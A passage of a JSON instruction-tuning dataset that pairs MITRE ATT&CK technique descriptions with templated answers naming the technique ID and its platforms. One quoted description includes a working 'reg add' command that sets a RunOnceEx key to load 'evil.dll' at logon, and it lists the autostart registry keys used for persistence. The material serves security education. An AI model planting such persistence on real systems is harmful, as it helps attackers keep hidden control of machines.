abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013);\nTechnique Obfuscated Files or Information: Encrypted/Encoded File (T1027.013) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "answer": "The provided description is related to MITRE technique Masquerading: Masquerade Task or Service (T1036.004);\nTechnique Masquerading: Masquerade Task or Service (T1036.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
    "context": "",
    "output": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "answer": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
    "context": "",
    "output": "The provided description is related to MITRE technique Dynamic Resolution: Domain Generation Algorithms (T1568.002);\nTechnique Dynamic Resolution: Domain Generation Algorithms (T1568.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
      "answer": "The provided description is related to MITRE technique Dynamic Resolution: Domain Generation Algorithms (T1568.002);\nTechnique Dynamic Resolution: Domain Generation Algorithms (T1568.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Lateral Tool Transfer (T1570);\nTechnique Lateral Tool Transfer (T1570) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.",
      "answer": "The provided description is related to MITRE technique Lateral Tool Transfer (T1570);\nTechnique Lateral Tool Transfer (T1570) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "answer": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service: One-Way Communication (T1102.003);\nTechnique Web Service: One-Way Communication (T1102.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The provided description is related to MITRE technique Web Service: One-Way Communication (T1102.003);\nTechnique Web Service: One-Way Communication (T1102.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
